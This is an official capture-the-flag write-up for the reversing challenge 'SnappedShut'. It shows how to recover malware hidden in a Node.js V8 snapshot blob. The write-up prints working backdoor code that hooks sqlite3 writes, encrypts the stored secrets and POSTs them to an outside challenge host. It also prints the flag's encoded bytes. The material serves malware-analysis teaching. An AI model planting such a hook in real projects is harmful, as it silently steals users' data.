<img src="../../../../../assets/banner.png" style="zoom: 80%;" align=center />

<img src="../../../../../assets/htb.png" style="zoom: 80%;" align='left' /><font size="6">SnappedShut</font>

  29<sup>th</sup> 04 24 / Document No. D24.102.61

  Prepared By: clubby789

  Challenge Author: clubby789

  Difficulty: <font color=green>Easy</font>

  Classification: Official






# Synopsis

SnappedShut is an Easy reversing challenge. Players must extract code embedded inside a Node JS snapshot blob.

## Skills Required
    - Basic JS knowledge
## Skills Learned
    - Reverse engineering V8-snapshot malware

# Solution

We're provided the source code for a Node JS based web server and a file `snapshot.blob`.

```js
const express = require('express');
const bodyParser = require('body-parser');
const sqlite3 = require('sqlite3').verbose();

const app = express();
const port = 3000;
const db = new sqlite3.Database(':memory:');
db.serialize(() => {
    db.run('CREATE TABLE IF NOT EXISTS secrets (id INTEGER PRIMARY KEY, secret TEXT)');
});
app.use(bodyParser.json());

app.post('/secret', (req, res) => {
  const secret = req.body.secret;
  if (!secret) {
    return res.status(400).json({ error: 'Secret parameter is missing' });
  }
  db.run("INSERT INTO secrets (secret) VALUES (?)", [secret], err => {
    if (err) {
        return res.status(500).json({ error: 'Failed to store secret' })
    }
    return res.json({ success: `Stored secret "${secret}"` });
  });
});

app.get('/secret', (req, res) => {
  db.all("SELECT secret FROM secrets", (err, rows) => {
    if (err) {
      return res.status(500).json({ error: 'Failed to retrieve secrets' });
    }
    const secrets = rows.map(row => row.secret);
    return res.json({ secrets });
  });
});

app.listen(port, () => {
  console.log(`Server is listening at http://localhost:${port}`);
});
```

The app creates a simple webserver, which allows users to upload 'secrets' - these are stored in an in-memory database.

`package.json` gives us a hint toward the backdoor mentioned;

```json
{
  "name": "secretsvc",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "author": "",
  "license": "ISC",
  "scripts": {
    "start": "node --snapshot-blob snapshot.blob index.js"
  },
  "dependencies": {
    "body-parser": "^1.20.2",
    "express": "^4.19.2",
    "sqlite3": "^5.1.7"
  }
}
```

The app is started using `--snapshot-blob snapshot.blob`. This is a mechanism implemented by Node JS - it allows applications to pre-initialize some global state, which is deserialized into the V8 cache on launch, potentially saving startup time.

It is a large binary blob, but if we run `strings` on it and scroll through the output, we can spot this unusual snippet of JS source code.

```js
require('v8').startupSnapshot.addDeserializeCallback(() => {
    function hook(secret) {
        const crypto = require('crypto');
        const key = Buffer.from([72,84,66,123,98,52,99,107,100,48,48,114,95,49,110,95,121,48,117,114,95,115,110,52,112,115,104,48,55,33,33,125], 'utf-8');
        const cipher = crypto.createCipheriv('aes-256-cbc', key, Buffer.alloc(16));
        let enc = cipher.update(JSON.stringify(secret), 'utf-8', 'base64');
        enc += cipher.final('base64');
        fetch("http://0l-xmarket.0merch-andise.htb", {
            mode: 'no-cors',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({"secrets": enc})
        })
        .catch(e => {})
    }
    function make_db_proxy(db) {
        return new Proxy(db, {
            get(obj, prop) {
                if (prop === "run") {
                    const orig_run = obj.run.bind(obj);
                    return (...args) => {
                        if (args.length >= 2) {
                            hook(args[1]);
                        }
                        return orig_run(...args);
                    }
                } else {
                    return obj[prop].bind(obj);
                }
            }
        })
    }
    const Module = require('module');
    Module.prototype.require = new Proxy(Module.prototype.require, {
        apply(target, thisArg, argsList) {
            const result = Reflect.apply(target, thisArg, argsList);
            if (argsList[0] == 'sqlite3') {
              const Database = result.Database;
              result.Database = new Proxy(Database, {
                construct(target, args) {
                    return make_db_proxy(new target(...args));
                },
              });
            }
            return result;
        }
    });
});
```

## Deserialize Callback

Snapshots can call `v8.startupSnapshot.addDeserializeCallback` to add a callback function which will be run on deserializing. In this case, there are several steps
- We proxy `Module.prototype.require` (the Node `require` function)
- If we are requiring `sqlite3`, we create a proxy for the `Database` class
- This proxy hooks the `run` property on any database object, and returns a function which calls `hook()` with `args[1]`
- `db.run()` is invoked with `db.run(sql, [arguments], [callback])`, so we are recording all arguments passed to the database's SQL
- The hook AES-encrypts our secret data and POSTs it to a suspicious website

If we decode the AES key we will receive the flag and solve the challenge.
